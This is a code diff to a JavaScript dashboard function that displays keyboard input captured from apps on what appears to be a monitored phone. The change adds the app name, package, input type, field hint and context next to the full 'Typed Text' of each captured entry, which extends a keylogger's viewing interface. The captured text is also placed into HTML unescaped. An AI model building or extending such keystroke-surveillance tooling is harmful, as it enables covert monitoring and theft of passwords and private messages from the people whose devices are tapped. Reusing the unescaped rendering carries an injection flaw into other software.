@@ -147,17 +147,21 @@ function displayActivitiesEnhanced(activities, containerId) {
                     break;
                     
                 case 'keyboard_input':
-                    const inputText = data.text || '';
-                    details = `App: ${data.appName || 'Unknown'} - Input: ${inputText.substring(0, 30)}${inputText.length > 30 ? '...' : ''}`;
+                    const inputText = data.inputText || data.text || '';
+                    const appName = data.appName || (data.packageName ? data.packageName.split('.').pop() : 'Unknown');
+                    details = `App: ${appName} - Input: ${inputText.substring(0, 30)}${inputText.length > 30 ? '...' : ''}`;
                     expandedContent = `
                         <div class="expanded-details">
-                            <div class="detail-row"><strong>App:</strong> ${data.appName || 'Unknown'}</div>
+                            <div class="detail-row"><strong>App:</strong> ${appName}</div>
                             <div class="detail-row"><strong>Package:</strong> ${data.packageName || 'Unknown'}</div>
+                            <div class="detail-row"><strong>Input Type:</strong> ${data.inputType || 'general'}</div>
                             <div class="detail-row"><strong>Time:</strong> ${time}</div>
                             <div class="message-content">
                                 <strong>Typed Text:</strong>
                                 <div class="message-text">${inputText || 'No text captured'}</div>
                             </div>
+                            ${data.hint ? `<div class="detail-row"><strong>Field Hint:</strong> ${data.hint}</div>` : ''}
+                            ${data.contentDescription ? `<div class="detail-row"><strong>Context:</strong> ${data.contentDescription}</div>` : ''}
                         </div>
                     `;
                     hasExpandedContent = true;
